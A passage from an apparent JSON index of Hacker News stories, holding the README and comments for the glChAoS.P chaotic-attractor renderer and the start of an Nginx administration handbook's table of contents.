(WebGL/WebAssembly release) 3rd party tools and color maps glChAoS.P uses 3rd party software tools components, they are located in the ./src/src/libs folder and built with the program. A copy of each is included in the repository, to avoid incompatibility with future changes. Structure and description of 3rd parts libraries/tools/palettes, and related copyrights and licenses: Libs and Tools Personal tools tools/vgMath 3D Math Library (single file header, glm compatible) https://github.com/BrutPitt/vgMath tools/vitualGizmo3D 3D objects manipulator (single file header) https://github.com/BrutPitt/virtualGizmo3D tools/imGuIZMO.quat ImGui widget: visual 3D objects manipulator https://github.com/BrutPitt/imGuIZMO.quat tools/fastPRNG 32/64 bit pseudo-random generator, xoshiro/xoroshiro/xorshift and other algorithms https://github.com/BrutPitt/fastPRNG Third party tools libs/imGui Dear ImGui https://github.com/ocornut/imgui *glChAoS.P uses docking release of ImGui (need >= 1.75) libs/configuru Configuru, an experimental JSON config library for C++ https://github.com/emilk/Configuru libs/tinyPLY C++11 ply 3d mesh format importer & exporter https://github.com/ddiakopoulos/tinyply libs/lodePNG LodePNG a PNG saver https://github.com/lvandeve/lodepng libs/tinyFileDialog file dialogs ( cross-platform C C++ ) https://github.com/native-toolkit/tinyfiledialogs libs/IconFontAwesome IconFontCppHeaders / Font Icon Toolkit https://github.com/juliettef/IconFontCppHeaders https://github.com/FortAwesome/Font-Awesome libs/glad GL/GLES/EGL/GLX/WGL Loader-Generator https://github.com/Dav1dde/glad libs/dirent \"dirent\" Unix/Linux filesystem interface port for Windows https://github.com/tronkko/dirent libs/glfw A multi-platform library for OpenGL, OpenGL ES, Vulkan, window and input https://github.com/glfw/glfw (need version >= 3.3, recommended enclosed pre-built) libs/nanoflann -> header-only library for KD-Trees of datasets point clouds https://github.com/jlblancoc/nanoflann (need only for DLA3D, in alternative you can use Boost Library compiling with GLAPP_USE_BOOST_LIBRARY define) Alternatives and optional, not closely necessary Below there are some used components, which differ from MIT / BSD 2-Clause / Zlib license. External Color Maps/Palettes - (optional - to load) colorMaps/jjg_gradient.json colorMaps/jjg_step.json J.J. Green palettes (creative commons noncommercial license) http://soliton.vm.bytemark.co.uk/pub/cpt-city/jjg/ccolo/index.html *Conversion from gpf format to json 256 variations. *optional separate files to load and to have more color maps Alternative Library glm Math Library - https://glm.g-truc.net/ Not more necessary. Now is used my vgMath single file header, used also in vitualGizmo3D and imGuIZMO.quat tools: it's a sub-set of glm, more compact, with or w/o template classes (selectable via define: vgConfig.h), and a studied interface that permits to switch between glm and vgMath only via compiler defines (vgConfig.h). Boost Library in particular: function_output_iterator and geometry are necessary as alternative (to nanoflann) to build DLA3D (Diffusion Limited Aggregation) object exploration in glChAoS.P (can be disabled). It's not included in the repository, but can be downloaded from https://www.boost.org/ It is not necessary to build the library, only headers files is enough. (more information in: how to build) Compile with -DGLAPP_USE_BOOST_LIBRARY flag, to use instead of nanoflann lib License glChAoS.P / wglChAoS.P are licensed under the BSD 2-Clause License, see license.txt for more information. ",
          "The released mac didn't work for me, but the webassembly webGL version is excellent - <a href=\"https://michelemorrone.eu/glchaosp/webGL.html\" rel=\"nofollow\">https://michelemorrone.eu/glchaosp/webGL.html</a>",
          "I tried to take a screenshot using Shift-Prtsc and I got:<p><pre><code>    double free or corruption (!prev)\n    Aborted (core dumped)\n</code></pre>\nI will give you more details when I get the time!"
        ],
        "story_type": ["Normal"],
        "url": "https://github.com/BrutPitt/glChAoS.P",
        "comments.comment_id": [21438835, 21445171],
        "comments.comment_author": ["gunn", "johnisgood"],
        "comments.comment_descendants": [4, 1],
        "comments.comment_time": [
          "2019-11-04T03:37:43Z",
          "2019-11-04T19:06:43Z"
        ],
        "comments.comment_text": [
          "The released mac didn't work for me, but the webassembly webGL version is excellent - <a href=\"https://michelemorrone.eu/glchaosp/webGL.html\" rel=\"nofollow\">https://michelemorrone.eu/glchaosp/webGL.html</a>",
          "I tried to take a screenshot using Shift-Prtsc and I got:<p><pre><code>    double free or corruption (!prev)\n    Aborted (core dumped)\n</code></pre>\nI will give you more details when I get the time!"
        ],
        "id": "cdde0801-dcfe-407c-8d64-84ee32fedc49",
        "url_text": "glChAoS.P wglChAoS.P - Ver 1.5.3 glChAoS.P / wglChAoS.P opengl / webgl Chaotic Attractors of Slight (dot) Particles RealTime 3D Strange Attractors scout on GPU The program also explores other chaotic-objects like hypercomplex fractals (IIM algorithm) and DLA3D JetBrains supports glChAoS.P wglChAoS.Pmany thanks to JetBrains for donating o.s.license for all their excellent products All available releases ==> Release Notes (what's new) Desktop - v.1.5.3 glChAoS.P - DeskTop - binaries available Windows / Linux / Mac OS WebGL - v.1.5.3 wglChAoS.P - WebG 2 via webAssembly - live / online using your browser - also for mobile devices You can select Advanced Mode check box (default) or deselect it (Standard Mode) for low resources devices (mobiles/tablet/smartphones) You can also to explore any single attractor, interactively, staring directly from web-page, using Explore button near/below any attractor formula: Attractors Formulas WebGL release is a more limited/lightened version, but frequently updated/rebuilt with last commits To view all \"chaotic-objects\" currently inserted in current release, follow the link: Attractors Formulas *any single object can be explored interactively via WebGL/WebAssembly directly from site. Latest features from ver.1.5.3 TransformFeedback multiDot particles emitter Now all dp/dt attractors (yellow tag) have an additional new emitter type to visualize them in a progressive way and/or with multiDot (spray) effect.\\ Is also possible to travel, in first person (cockpit view), within the particles, following the evolution of the attractors. Lorenz Attractor - click on image to \"explore\" it in WebGL use \"v\" key or \"cockpit\" button (from Attractors tools window) to switch to subjective view (on right) New menu is available to adjust these settings: 1) Panoramic/CockPit dots/s: different emitter speed for any view 2) Number of dots for each step, real dots/s emitted are: dots/s * Emit# 3) Multiplication factor of initial radial random speed 4) Air friction/deceleration 5) Point size: there are 3 different \"pointSize\" for: singleDot emitter, multiDot emitter and cockpitView 6) Particles LifeTime, in sec. 7) LifeTime attenuation: when the lifeTime ends, in blending mode, the particle attenuates the intensity of this factor, any second 8) Wind direction and intensity (in units/s) 9) Gravity/Acceleration direction and intensity (in units/s) A) Toggle cockpit view and related settings (following controls) B) Smoothing distance: in blending mode attenuates the intensity of near dots by distance C) Clipping distance: skip to draw closer particles D) PiP (Picture In Picture) feature E) TagretView is the current emitted dot, PointOfView is positioned on the wake: it adjusts the distance from head (it follows the attractor direction). F) Move back the PoV: it follows the vector PoV -> TGT G) Rotate the cam around TagretView, or better: around attractor head (last emitted dot), use reset to reposition the cam H) Move forward the TagretView position Youtube Video Simulating a comet's journey in Lorenz attractor Voyage in Multi-Chua II attractor ver.1.4.2 feature: 11 unpublished attractor types: PopCorn, Mira, Hopalong and... An absolutely personal and original \"transformations\" in 3D/4D of famous 2D attractors: PopCorn, Morrone 4D transf. (ssss) Martin, Morrone 4D transf. PopCorn, Morrone 4D transf. (scsc) Mira, , Morrone 4D transf. Mira, Morrone 3D transf. Hopalong, Morrone 4D transf. Full descriptions, math formulas and code in the relative webpage: PopCorn, Mira, Hopalong and... *now any single attractor is also explorable interactively via WebGL/WebAssembly directly from site. Particle System rendering features 100M of particles in minus of 1.6 GByte of VRAM.. up to 265M (4G VRAM): Slight (dot) Particles only a vec4 (4-float) per vertex for position and color Rendering: RealTime Surface Reconstruction / Shadows / Ambient Occlusion Light Models: Phong / Blinn-Phong / GGX Glow effects: Gaussian Blur / bilateral deNoise with threshold / Gaussian + deNoise Anti-aliasing: FXAA Image adjustment: Bright / Contrast / Gamma / Exposure / ToneMapping With Billboard and PointSprite techniques 3D DLA (Diffusion Limited Aggregation) - DLA3D Video Example This is an integrated version of more simple my DLAf-optimized repo that I used in glChAoS.P / wglChAoS.P for large-scale DLA3D growth, with possibility to export/import to/from PLY format and to continue a previous rendering. Rendering models with Aizawa attractor - Video Example Alpha Blending Solid Dots Further rendering engine improvement (from ver. >= 1.3.x) - Rendering Video Example DualPass rendering: Z-buffer surface reconstruction DualPass + Ambient Occlusion DualPass + AO + Shadows DualPass + AO + Shadows + mixed AlphaBlending *features also available in WebGL advanced version wglChAoS.P - WebGL2 online version This is a WebGL2 / WebAssembly lightened LIVE / ONLINE version of glChAoSP and Supports touch screen for mobile devices, smartphones and tablets Go to wglChAoS.P - LIVE / ONLINE starting page wglChAoS.P Advanced Mode - WebGL2 with new rendering engine Starting from ver 1.3.2, also WebGL have new rendering engine: dual pass accurate rendering, shadows and ambient occlusion *Advanced Mode not available/tested still for mobile devices Hypercomplex fractals like attractors - via IIM (Inverse Iterations Method) hypercomplex fractals hypercomplex fractals glChAoS.P features glChAoS.P is a 3D realtime Particle System with some unique features: 100M of particles in minus of 1.6 GByte of VRAM.. until 265M (4G VRAM): Slight (dot) Particles only 4-float (vec4) per vertex: position and color PointSprite and Billboard particles types 3D blended/solid/lighted particles Single dot or DualPass rendering (surface reconstruction from zBuffer) Shadows and AmbientOcclusion Light models: Phong / Blinn-Phong / GGX Distance attenuation on Size an Alpha channel Full customizable colors, with several color palettes Customizable glow effects: Gaussian Blur / bilateral deNoise with threshold / Gaussian + deNoise Customizable FXAA filter Motion blur Post processing image correction: gamma exposure brightness contrast toneMapping / HDR ... and more For more usage info: glChAoS.P info Some screenshots from different operating systems Windows Windows Viewports Linux Mac OS X Hardware required: glChAoS.P - GPU with OpenGL 4.1 or higher wglChAoS.P - Browser with WebGL2 capabilities (FireFox, Chrome or Chromium based browsers) Theoretically all graphics card that supports OpenGL 4.0 supports also OpenGL 4.5, depends only from drivers (and O.S.) About the GPUs that support the OpenGL 4.5 (with appropriate drivers and OS permitting): NVidia starting from GT/GTX 4xx series AMD starting from HD 5xxx series Intel starting from Ivy Bridge/Bay Trail CPUs (with HD 4000/2500 graphics) Hardware recommended: GPU starting from AMD HD 7970 / NVidia GTX 670 or with better performance CPU with 2 or more cores About performance Glow effects, mostly with sigma > 5, and DualPass/Shadows/AO requires expensive calculations in terms of performance If you have slow performance try, in this order: Disable DualPass rendering and/or AO and/or Shadows Disable GlowEffects and/or FXAA Prefer Pointsprite: on AMD and Intel GPU (sensible difference of performance) Decrease number of particles buffer < 3000 Decrease point size (if you can) try squared 1024x1024 (power of 2) window size (from Settings panel) Supported Operating systems: Microsoft Windows Linux/Unix Mac OS X Android via webBrowser (wglChAoS.P WebGL/webAssembly, lightned version) Tested Operating System Versions: Microsoft Windows 7/8.x/10 Linux distributions: Ubuntu 16.04 -> 20.04, Fedora 27 -> 32 Mac OS 10.14 (Mojave), 10.15 (Catalina) Android 5/6/7/8/9 with Firefox and Chrome Executables No installation program is provided: just clone it form github or download the archive and decompress it in a folder whatever: only the internal directories structure must be preserved. For Windows and Linux glChAoSP uses OpenGL 4.5 with AZDO (Approaching Zero Driver Overhead) and a separate thread (multithread) emitter/generator of particles with memory mapped directly on GPU vRAM. On Mac OS X, for a limitation of the OS (from Mojave Apple have deprecated OpenGL) there is a downgraded version that use OpenGL 4.1 (higher possible) with a separate thread emitter/generator that uses the conventional CPU memory. Are provided executable for the followings OS: Windows glChAoSP.exe and glChAoSP_32.exe: native executable (64 and 32 bit) are provided for OpenGL >= 4.5: Preferably use the 64-bit version. (you can recompile it, with appropriate define, to obtain an OpenGL 4.1 compliant) glChAoSP_viewports.exe: beta version of multiple viewports is also provided (floating GUI windows that can go out outside of main Viewport/Window): (only 64 bits). This is a great version, solid beta and full functional, but based on a under development version of ImGui library. Linux glChAoSP_Linux: native executable (64 bit) is provided for OpenGL >= 4.5: it was tested on Fedora and Ubuntu LTS. (you can recompile it, with appropriate define, to obtain an OpenGL 4.1 compliant) Take care to have installed OpenGL library, whereas libX11 libXext should already be installed. After clone, copy or decompression, take care that executable bit of the file glChAoSP_Linux is active (chmod +x). Use glChAoSP_Linux.sh to launch it from fileBrowsers like Nautilus or Caja. wine The Windows executable, 32/64 bit, works fine also in wine 3.xx with no evident loss of performance Mac OS glChAoSP_OSX: native executable (64 bit) is provided for OpenGL 4.1 From Finder click on applescript: glChAoSP_OSX.app, or form command line type directly the command: ./glChAoSP_OSX It was tested on OS X ver 10.14 (Mojave) only, although with subsequent updates and different library versions you may need to rebuild it. Read Build/CMake sections for further information. NOTE: For Windows and Linux glChAoS.P uses OpenGL 4.5 with AZDO (Approaching Zero Driver Overhead) and a separate thread (multithread) emitter/generator of particles with memory mapped directly on GPU vRAM. On Mac OS, for a limitation of the OS (from Mojave Apple have deprecated OpenGL) there is a downgraded version, that use OpenGL 4.1 (higher possible) with a separate thread emitter/generator that use the conventional CPU memory. Furthers build option are provided: Use OpenGL 4.1 also on Windows and Linux. Single thread version. To build glChAoS.P Build requirements Compilers with full C++14 standard required CMake 3.15 or higher Boost Library to build DLA3D (Diffusion Limited Aggregation) object exploration, (or uncomment DISABLE_DLA3D in CMake file to disable it) it has been replaced with nanoflann header-only (enclosed) Tested Compilers Microsoft Visual Studio 2019/2017/2015 (Platform Toolset v.142/141/140: it does not work with previous releases) MinGW (64bit) v.9 CLang from v.5 to current GNU C++ from v.5 to current CMake In the folder ./src there is the CmakeLists.txt, use this folder as base directory. Read below more about your OS. GLFW Library Enclosed 32/64bit built library for Windows, and 64bit for Linux and OS X When build glChAoSP, compiler looks for GLFW library in the follows path: src/src/libs/glfw/buildLinux (Linux) src/src/libs/glfw/buildOSX (OSX) src/src/libs/glfw/buildWin (Windows) You need to delete it, and/or modify the CMake file, to use personal ones version. In this case you need to have installed GLFW Library, ver 3.3 or higher, or re-build the enclosed version in ./src/src/libs/glfw folder. Build glChAoS.P in Windows Windows user needs of Visual Studio 2019 (it works also wit VS 2017/2015, but is need to change appropriate Platform Toolset and/or Windows SDK version that you have installed). In alternative, CMake 3.10 (or higher) for other compilers toolchain (non tested, but it should work). Microsoft Visual Studio VS solution In the folder ./src/msBuilds there is the solution project for use with Visual Studio 2017/2019. (check appropriate Platform Toolset and/or Windows SDK version that you have installed) You can use also LLVM CLang to build glChAoS.P from Visual Studio: you can use the LLVM plugin (after to have installed clang, in windows) and simply change the toolchain in Properties -> General -> Platform Toolset The current VisualStudio solution refers to my environment variable RAMDISK (R:), and subsequent VS intrinsic variables to generate binary output: $(RAMDISK)\\$(MSBuildProjectDirectoryNoRoot)\\$(DefaultPlatformToolset)\\$(Platform)\\$(Configuration)\\ Even without a RAMDISK variable, executable and binary files are outputted in base to the values of these VS variables, starting from root of current drive. VS with CMakeFile.txt and CMakeSettings.json (testing fase - VS2019 only) Open ./src folder in vs2019 you can build both Emscripten / CLang inside Visual Studio CMake You can use CMake to compile with CLang / MinGW, using mingw_make or ninja tool. NOTE: To build viewports version you need to add -DGLAPP_IMGUI_VIEWPORT to compiler flags, or uncomment it in appDefines.h Build glChAoS.P in Linux Tools required Linux users need to install the GCC C/C++ v.5 or higher (or clang v.5 or higher) compilers and associated tools such as make and CMake (need v3.10 or higher). To install gcc C/C++: Debian, Ubuntu: sudo apt-get install build-essential cmake cmake-qt-gui Fedora, RedHat: sudo dnf install make gcc-c++ cmake cmake-gui You need also to have installed OpenGL library and relative development package: libgl1-mesa libgl1-mesa-dev (Ubuntu) or mesa-libGL mesa-libGL-devel (Fedora). Build Form a Terminal window, just launch sh build_glChAoSP.sh script (from ./src folder) to build glChAoSP, it first runs cmake with appropriate parameters and then starts make to build glChAoSP_Linux executable: it will stored in parent folder (../). the script uses the enclosed built version of GLFW Another script, buildLinux.sh, is provided (as helper) to re-build GLFW: it calls buildGLFW.sh (to build/re-build GLFW) and build_glChAoSP.sh sequentially. To build/rebuild GLFW from enclosed sources you must have installed also development packages: libx11-dev libxext-dev (Ubuntu) or libX11-devel libXext-devel (Fedora). *(documentation: https://github.com/glfw/glfw) Build glChAoS.P in Mac OS Tools required Mac users must have installed Xcode and the Command Line Tools, also CMake 3.10 or higher is necessary. Build Form a Terminal window, just launch sh build_glChAoSP.sh script (from ./src folder) to build glChAoSP, it first runs cmake with appropriate parameters and then starts make to build glChAoSP_OSX executable: it will stored in parent folder (../) the script uses the enclosed built version of GLFW Another script, buildOSX.sh, is provided (as helper) to re-build GLFW: it calls buildGLFW.sh OSX (to build/re-build GLFW) and build_glChAoSP.sh sequentially. *(documentation: https://github.com/glfw/glfw) Build wglChAoS.P with EMSCRIPTEN - WebGL via WebAssembly The CMake file is able to build also an EMSCRIPTEN version, obviously you need to have installed EMSCRIPTEN SDK on your computer (1.38.20 1.38.28 1.38.40 or higher). Use emsCMakeGen.cmd or emsCMakeGen.sh from ./src directory, or look inside it, to pass appropriate defines/parameters to CMake command line. emsCMakeGen need to know the location of EMSDK, and the \"build-type\" object to create. For example, run: emsCMakeGen.sh /opt/emsdk/emscripten/1.38.20 Debug|Release|RelWithDebInfo|MinSizeRel wglChAoSP|wglChAoSP_lowres emsCMakeGen.cmd C:\\emsdk\\emscripten\\1.38.20 Debug|Release|RelWithDebInfo|MinSizeRel To build the EMSCRIPTEN version, in Windows, with CMake, need to have mingw32-make in your computer and in the search PATH (only the make utility is enough) or Ninja. Currently all the shell/cmd scripts use Ninja to build wglChAoS.P (WebGL/WebAssembly release) 3rd party tools and color maps glChAoS.P uses 3rd party software tools components, they are located in the ./src/src/libs folder and built with the program. A copy of each is included in the repository, to avoid incompatibility with future changes. Structure and description of 3rd parts libraries/tools/palettes, and related copyrights and licenses: Libs and Tools Personal tools tools/vgMath 3D Math Library (single file header, glm compatible) https://github.com/BrutPitt/vgMath tools/vitualGizmo3D 3D objects manipulator (single file header) https://github.com/BrutPitt/virtualGizmo3D tools/imGuIZMO.quat ImGui widget: visual 3D objects manipulator https://github.com/BrutPitt/imGuIZMO.quat tools/fastPRNG 32/64 bit pseudo-random generator, xoshiro/xoroshiro/xorshift and other algorithms https://github.com/BrutPitt/fastPRNG Third party tools libs/imGui Dear ImGui https://github.com/ocornut/imgui *glChAoS.P uses docking release of ImGui (need >= 1.75) libs/configuru Configuru, an experimental JSON config library for C++ https://github.com/emilk/Configuru libs/tinyPLY C++11 ply 3d mesh format importer & exporter https://github.com/ddiakopoulos/tinyply libs/lodePNG LodePNG a PNG saver https://github.com/lvandeve/lodepng libs/tinyFileDialog file dialogs ( cross-platform C C++ ) https://github.com/native-toolkit/tinyfiledialogs libs/IconFontAwesome IconFontCppHeaders / Font Icon Toolkit https://github.com/juliettef/IconFontCppHeaders https://github.com/FortAwesome/Font-Awesome libs/glad GL/GLES/EGL/GLX/WGL Loader-Generator https://github.com/Dav1dde/glad libs/dirent \"dirent\" Unix/Linux filesystem interface port for Windows https://github.com/tronkko/dirent libs/glfw A multi-platform library for OpenGL, OpenGL ES, Vulkan, window and input https://github.com/glfw/glfw (need version >= 3.3, recommended enclosed pre-built) libs/nanoflann -> header-only library for KD-Trees of datasets point clouds https://github.com/jlblancoc/nanoflann (need only for DLA3D, in alternative you can use Boost Library compiling with GLAPP_USE_BOOST_LIBRARY define) Alternatives and optional, not closely necessary Below there are some used components, which differ from MIT / BSD 2-Clause / Zlib license. External Color Maps/Palettes - (optional - to load) colorMaps/jjg_gradient.json colorMaps/jjg_step.json J.J. Green palettes (creative commons noncommercial license) http://soliton.vm.bytemark.co.uk/pub/cpt-city/jjg/ccolo/index.html *Conversion from gpf format to json 256 variations. *optional separate files to load and to have more color maps Alternative Library glm Math Library - https://glm.g-truc.net/ Not more necessary. Now is used my vgMath single file header, used also in vitualGizmo3D and imGuIZMO.quat tools: it's a sub-set of glm, more compact, with or w/o template classes (selectable via define: vgConfig.h), and a studied interface that permits to switch between glm and vgMath only via compiler defines (vgConfig.h). Boost Library in particular: function_output_iterator and geometry are necessary as alternative (to nanoflann) to build DLA3D (Diffusion Limited Aggregation) object exploration in glChAoS.P (can be disabled). It's not included in the repository, but can be downloaded from https://www.boost.org/ It is not necessary to build the library, only headers files is enough. (more information in: how to build) Compile with -DGLAPP_USE_BOOST_LIBRARY flag, to use instead of nanoflann lib License glChAoS.P / wglChAoS.P are licensed under the BSD 2-Clause License, see license.txt for more information. ",
        "_version_": 1718527433957703681
      },
      {
        "story_id": [19112090],
        "story_author": ["1nvalid"],
        "story_descendants": [19],
        "story_score": [172],
        "story_time": ["2019-02-08T06:51:28Z"],
        "story_title": "Nginx quick reference",
        "search": [
          "Nginx quick reference",
          "https://github.com/trimstray/nginx-quick-reference",
          "Nginx Admin's Handbook My notes on NGINX administration basics, tips & tricks, caveats, and gotchas. Hi-diddle-diddle, he played on his fiddle and danced with lady pigs. Number three said, \"Nicks on tricks! I'll build my house with EN-jin-EKS!\". The Three Little Pigs: Who's Afraid of the Big Bad Wolf? Table of Contents Introduction Prologue Why I created this handbook Who this handbook is for Before you start Contributing & Support RSS Feed & Updates Checklist to rule them all Bonus Stuff Configuration reports SSL Labs Mozilla Observatory Printable hardening cheatsheets Fully automatic installation Static error pages generator Server names parser Books Nginx Essentials Nginx Cookbook Nginx HTTP Server Nginx High Performance Mastering Nginx ModSecurity 3.0 and NGINX: Quick Start Guide Cisco ACE to NGINX: Migration Guide External Resources Nginx official Nginx distributions Comparison reviews Cheatsheets & References Performance & Hardening Presentations & Videos Playgrounds Config generators Config parsers Config managers Static analyzers Log analyzers Performance analyzers Builder tools Benchmarking tools Debugging tools Security & Web testing tools Development Online & Web tools Other stuff What's next? Other chapters HTTP Basics Introduction Features and architecture HTTP/2 How to debug HTTP/2? HTTP/3 URI vs URL Connection vs request HTTP Headers Header compression HTTP Methods Request Request line Methods Request URI HTTP version Request header fields Message body Generate requests Response Status line HTTP version Status codes and reason phrase Response header fields Message body HTTP client IP address shortcuts Back-End web architecture Useful video resources SSL/TLS Basics Introduction TLS versions TLS handshake In which layer is TLS situated within the TCP/IP stack? RSA and ECC keys/certificates Cipher suites Authenticated encryption (AEAD) cipher suites Why cipher suites are important? What does insecure, weak, secure and recommended mean? NGINX and TLS 1.3 Cipher Suites Diffie-Hellman key exchange What exactly is the purpose of these DH Parameters? Certificates Chain of Trust What is the main purpose of the Intermediate CA? Single-domain Multi-domain Wildcard Wildcard SSL doesn't handle root domain? HTTPS with self-signed certificate vs HTTP TLS Server Name Indication Verify your SSL, TLS & Ciphers implementation Useful video resources NGINX Basics Directories and files Commands Processes CPU pinning Shutdown of worker processes Configuration syntax Comments End of lines Variables, Strings, and Quotes Directives, Blocks, and Contexts External files Measurement units Regular expressions with PCRE Enable syntax highlighting Connection processing Event-Driven architecture Multiple processes Simultaneous connections HTTP Keep-Alive connections sendfile, tcp_nodelay, and tcp_nopush Request processing stages Server blocks logic Handle incoming connections Matching location rewrite vs return URL redirections try_files directive if, break, and set root vs alias internal directive External and internal redirects allow and deny uri vs request_uri Compression and decompression What is the best NGINX compression gzip level? Hash tables Server names hash table Log files Conditional logging Manually log rotation Error log severity levels How to log the start time of a request? How to log the HTTP request body? NGINX upstream variables returns 2 values Reverse proxy Passing requests Trailing slashes Passing headers to the backend Importance of the Host header Redirects and X-Forwarded-Proto A warning about the X-Forwarded-For Improve extensibility with Forwarded Response headers Load balancing algorithms Backend parameters Upstream servers with SSL Round Robin Weighted Round Robin Least Connections Weighted Least Connections IP Hash Generic Hash Other methods Rate limiting Variables Directives, keys, and zones Burst and nodelay parameters NAXSI Web Application Firewall OWASP ModSecurity Core Rule Set (CRS) Core modules ngx_http_geo_module 3rd party modules ngx_set_misc ngx_http_geoip_module Helpers Installing from prebuilt packages RHEL7 or CentOS 7 Debian or Ubuntu FreeBSD Installing from source Automatic installation on RHEL/Debian/BSD Nginx package Dependencies Patches 3rd party modules Configure options Compiler and linker Debugging Symbols SystemTap stapxx Installation Nginx on CentOS 7 Pre installation tasks Dependencies Get Nginx sources Download 3rd party modules Build Nginx Post installation tasks Installation OpenResty on CentOS 7 Installation Tengine on Ubuntu 18.04 Installation Nginx on FreeBSD 11.3 Installation Nginx on FreeBSD 11.3 (from ports) Analyse configuration Monitoring GoAccess Build and install Analyse log file and enable all recorded statistics Analyse compressed log file Analyse log file remotely Analyse log file and generate html report Ngxtop Analyse log file Analyse log file and print requests with 4xx and 5xx Analyse log file remotely Testing Build OpenSSL 1.0.2-chacha version Send request and show response headers Send request with http method, user-agent, follow redirects and show response headers Send multiple requests Testing SSL connection Testing SSL connection (debug mode) Testing SSL connection with SNI support Testing SSL connection with specific SSL version Testing SSL connection with specific cipher Testing OCSP Stapling Verify 0-RTT Testing SCSV Load testing with ApacheBench (ab) Standard test Test with Keep-Alive header Load testing with wrk2 Standard scenarios POST call (with Lua) Random paths (with Lua) Multiple paths (with Lua) Random server address to each thread (with Lua) Multiple json requests (with Lua) Debug mode (with Lua) Analyse data pass to and from the threads Parsing wrk result and generate report Load testing with locust Multiple paths Multiple paths with different user sessions TCP SYN flood Denial of Service attack HTTP Denial of Service attack Debugging Show information about processes Check memory usage Show open files Check segmentation fault messages Dump configuration Get the list of configure arguments Check if the module has been compiled Show the most accessed IP addresses Show the most accessed IP addresses (ip and url) Show the most accessed IP addresses (method, code, ip, and url) Show the top 5 visitors (IP addresses) Show the most requested urls Show the most requested urls containing 'string' Show the most requested urls with http methods Show the most accessed response codes Analyse web server log and show only 2xx http codes Analyse web server log and show only 5xx http codes Show requests which result 502 and sort them by number per requests by url Show requests which result 404 for php files and sort them by number per requests by url Calculating amount of http response codes Calculating requests per second Calculating requests per second with IP addresses Calculating requests per second with IP addresses and urls Get entries within last n hours Get entries between two timestamps (range of dates) Get line rates from web server log Trace network traffic for all processes List all files accessed by a NGINX Check that the gzip_static module is working Which worker processing current request Capture only http packets Extract User Agent from the http packets Capture only http GET and POST packets Capture requests and filter by source ip and destination port Capture HTTP requests/responses in real time, filter by GET, HEAD and save to a file Dump a process's memory GNU Debugger (gdb) Dump configuration from a running process Show debug log in memory Core dump backtrace Debugging socket leaks Shell aliases Configuration snippets Nginx server header removal Custom log formats Log only 4xx/5xx Restricting access with basic authentication Restricting access with client certificate Restricting access by geographical location GeoIP 2 database Dynamic error pages with SSI Blocking/allowing IP addresses Blocking referrer spam Limiting referrer spam Blocking User-Agent Limiting User-Agent Limiting the rate of requests with burst mode Limiting the rate of requests with burst mode and nodelay Limiting the rate of requests per IP with geo and map Limiting the number of connections Using trailing slashes Properly redirect all HTTP requests to HTTPS Adding and removing the www prefix Proxy/rewrite and keep the original URL Proxy/rewrite and keep the part of original URL Proxy/rewrite without changing the original URL (in browser) Modify 301/302 response body Redirect POST request with payload to external endpoint Route to different backends based on HTTP method Allow multiple cross-domains using the CORS headers Set correct scheme passed in X-Forwarded-Proto Other snippets Recreate base directory Create a temporary static backend Create a temporary static backend with SSL support Generate password file with htpasswd command Generate private key without passphrase Generate private key with passphrase Remove passphrase from private key Encrypt existing private key with a passphrase Generate CSR Generate CSR (metadata from existing certificate) Generate CSR with -config param Generate private key and CSR List available EC curves Print ECDSA private and public keys Generate ECDSA private key Generate private key and CSR (ECC) Generate self-signed certificate Generate self-signed certificate from existing private key Generate self-signed certificate from existing private key and csr Generate multidomain certificate (Certbot) Generate wildcard certificate (Certbot) Generate certificate with 4096 bit private key (Certbot) Generate DH public parameters Display DH public parameters Extract private key from pfx Extract private key and certs from pfx Extract certs from p7b Convert DER to PEM Convert PEM to DER Verification of the certificate's supported purposes Check private key Verification of the private key Get public key from private key Verification of the public key Verification of the certificate Verification of the CSR Check the private key and the certificate are match Check the private key and the CSR are match TLSv1.3 and CCM ciphers Base Rules (16) Organising Nginx configuration Format, prettify and indent your Nginx code Use reload option to change configurations on the fly Separate listen directives for 80 and 443 ports Define the listen directives with address:port pair Prevent processing requests with undefined server names Never use a hostname in a listen or upstream directives Set the HTTP headers with add_header and proxy_*_header directives properly Use only one SSL config for the listen directive Use geo/map modules instead of allow/deny Map all the things... Set global root directory for unmatched locations Use return directive for URL redirection (301, 302) Configure log rotation policy Use simple custom error pages Don't duplicate index directive, use it only in the http block Debugging (5) Use custom log formats Use debug mode to track down unexpected behaviour Improve debugging by disable daemon, master process, and all workers except one Use core dumps to figure out why NGINX keep crashing Use mirror module to copy requests to another backend Performance (13) Adjust worker processes Use HTTP/2 Maintaining SSL sessions Enable OCSP Stapling Use exact names in a server_name directive if possible Avoid checks server_name with if directive Use $request_uri to avoid using regular expressions Use try_files directive to ensure a file exists Use return directive instead of rewrite for redirects Enable PCRE JIT to speed up processing of regular expressions Activate the cache for connections to upstream servers Make an exact location match to speed up the selection process Use limit_conn to improve limiting the download speed Hardening (31) Always keep NGINX up-to-date Run as an unprivileged user Disable unnecessary modules Protect sensitive resources Take care about your ACL rules Hide Nginx version number Hide Nginx server signature Hide upstream proxy headers Remove support for legacy and risky HTTP request headers Use only the latest supported OpenSSL version Force all connections over TLS Use min. 2048-bit for RSA and 256-bit for ECC Keep only TLS 1.3 and TLS 1.2 Use only strong ciphers Use more secure ECDH Curve Use strong Key Exchange with Perfect Forward Secrecy Prevent Replay Attacks on Zero Round-Trip Time Defend against the BEAST attack Mitigation of CRIME/BREACH attacks Enable HTTP Strict Transport Security Reduce XSS risks (Content-Security-Policy) Control the behaviour of the Referer header (Referrer-Policy) Provide clickjacking protection (X-Frame-Options) Prevent some categories of XSS attacks (X-XSS-Protection) Prevent Sniff Mimetype middleware (X-Content-Type-Options) Deny the use of browser features (Feature-Policy) Reject unsafe HTTP methods Prevent caching of sensitive data Limit concurrent connections Control Buffer Overflow attacks Mitigating Slow HTTP DoS attacks (Closing Slow Connections) Reverse Proxy (8) Use pass directive compatible with backend protocol Be careful with trailing slashes in proxy_pass directive Set and pass Host header only with $host variable Set properly values of the X-Forwarded-For header Don't use X-Forwarded-Proto with $scheme behind reverse proxy Always pass Host, X-Real-IP, and X-Forwarded headers to the backend Use custom headers without X- prefix Always use $request_uri instead of $uri in proxy_pass Load Balancing (2) Tweak passive health checks Don't disable backends by comments, use down parameter Others (4) Set the certificate chain correctly Enable DNS CAA Policy Define security policies with security.txt Use tcpdump to diagnose and troubleshoot the HTTP issues Configuration Examples Reverse Proxy Installation Configuration Import configuration Set bind IP address Set your domain name Regenerate private keys and certs Update modules list Generating the necessary error pages Add new domain Test your configuration Introduction Before you start playing with NGINX please read an official Beginners Guide. It's a great introduction for everyone. Nginx (/ndnks/ EN-jin-EKS, stylized as NGINX or nginx) is an open source 